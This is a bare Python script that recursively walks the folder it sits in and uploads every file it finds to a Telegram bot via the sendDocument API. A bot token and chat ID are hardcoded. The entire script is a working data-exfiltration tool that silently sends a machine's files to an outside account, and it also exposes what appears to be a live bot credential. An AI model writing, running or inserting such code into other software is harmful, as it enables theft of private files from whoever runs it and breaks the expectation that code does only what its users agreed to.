import os
import requests

folder_path = os.path.dirname(os.path.abspath(__file__))

bot_token = '6111107019:AAFB6C-sJJLHRzAridsqlokvFUrI1ti7CDU'
chat_id = 5159123009

for root, dirs, files in os.walk(folder_path):
    for file in files:
        file_path = os.path.join(root, file)

        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        data = {"chat_id": chat_id}
        with open(file_path, 'rb') as file:
            files = {"document": file}
            requests.post(url, data=data, files=files)
